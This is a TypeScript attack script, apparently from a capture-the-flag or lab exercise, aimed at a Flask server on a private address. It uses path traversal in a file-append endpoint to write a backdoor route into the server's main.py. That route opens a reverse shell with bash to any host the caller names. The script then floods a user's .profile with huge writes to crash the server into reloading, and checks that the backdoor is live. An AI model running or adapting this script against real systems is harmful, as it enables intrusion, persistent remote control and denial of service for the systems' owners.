export {};

const serverUrl = "http://10.2.17.11:5000";

const appendFile = async (file: string, line: string) => {
  const result = await fetch(`${serverUrl}/ðŸ’ŽðŸ™Œ`, {
    headers: {
      "content-type": "application/json",
    },
    body: `{"ðŸ“ˆ":["${file}"], "ðŸš€":"${line}\\n"}`,
    method: "POST",
  });
  if (!result.ok) {
    console.error(result);
    console.error(await result.text().catch(() => "error"));
    throw new Error("Failed to append to " + file);
  }
  const content = await result.text();
  return content;
};

const installPayload = async () => {
  const main = await appendFile(
    "../../../../../../../../../proc/self/cwd/main.py",
    `
@app.route("/other", methods=['POST'])
def other():
    return request.json["host"] + request.json["port"]

@app.route("/revshell", methods=['POST'])
def revshell():
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((request.json["host"],int(request.json["port"])))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    import pty
    os.environ['TERM'] = 'xterm-256color'
    pty.spawn("/bin/bash")
    s.shutdown(socket.SHUT_RDWR)
    s.close()
    return "revshell started"

@app.route("/installcheck")
def installcheck():
    return "Already installed revshell"
    `
      .replaceAll("\n", "\\n")
      .replaceAll('"', '\\"')
  );
  console.log(main);
};

const payloadIsInstalled = async () => {
  const onlineAtAll = await fetch(`${serverUrl}`, {
    headers: {
      "content-type": "application/json",
    },
    method: "GET",
  });
  if (!onlineAtAll.ok) {
    throw new Error(`The server at seems down`);
  }

  const result = await fetch(`${serverUrl}/installcheck`, {
    headers: {
      "content-type": "application/json",
    },
    method: "GET",
  });
  return result.ok;
};

const crashServer = async () => {
  const aLotOfData = "#" + "2".repeat(Math.pow(2, 28));

  try {
    while (true) {
      const main = await appendFile(
        "../../../../../../../../../home/user/.profile",
        aLotOfData
      );
      console.log(main);
      console.log("Server is still not down");
    }
  } catch {
    // Server down => good
  }
  // Kick it after 5 seconds, so it comes up again
  await new Promise((r) => {
    setTimeout(r, 5000);
  });
  try {
    await fetch(`${serverUrl}`, {
      method: "GET",
    });
  } catch {
    // This probably fails
  }
};

if (!(await payloadIsInstalled())) {
  console.log("Installing revshell route");
  await installPayload();
  console.log(
    "Crashing server to force a reload. This can take up to 10 minutes"
  );
  await crashServer();
  console.log("Crashed server successfully");
  console.log("Verifying, that the install worked");
  await new Promise((r) => {
    setTimeout(r, 15000);
  });

  if (!(await payloadIsInstalled())) {
    throw new Error("Failed to verify successfull payload installation");
  }
} else {
  console.log("Payload is already installed");
}

console.log("Payload is installed successfully. Try revshell.sh to trigger it");
